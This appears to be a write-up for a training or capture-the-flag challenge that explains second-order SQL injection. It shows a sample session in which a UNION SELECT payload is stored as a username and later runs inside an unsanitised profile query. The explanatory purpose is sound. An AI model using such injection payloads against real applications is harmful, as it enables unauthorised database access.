# Overview
This challenge demonstrates second order SQL Injection, a extremely dangerous where the initial input seems harmless, because it's stored and not immediately executed. Later, that stored string is used in an unsafe SQL context. The payload activates only when the application performs another SQL operation. This mimics real production systems like web apps that storing user profiles, CRM systems, audit logs, admin dashboards or authentication flows using stored data.
## Vulnerability explanation
Regular SQL injection happens immediately. Second-order SQL injection occurs when attacker submits malicious input, which gets stored safely into a DB. That stored payload is later used in an SQL query without sanitization. The injection triggers at a later stage. This usually bypasses WAF, input validation, and logging because the "attack" happens later.
```
./challenge4
=== Registration ===
Enter username: Trundle' UNION SELECT 1, 'pwned', 'TrundleHacker@evil.com' --
Enter email: This is not important anymore! :) <3 
SQL error: near "UNION": syntax error

User registered.

=== Loading profile ===
Running query: SELECT id, username, email FROM users WHERE username = 'Trundle' UNION SELECT 1, 'pwned', 'TrundleHacker@evil.com' --';
```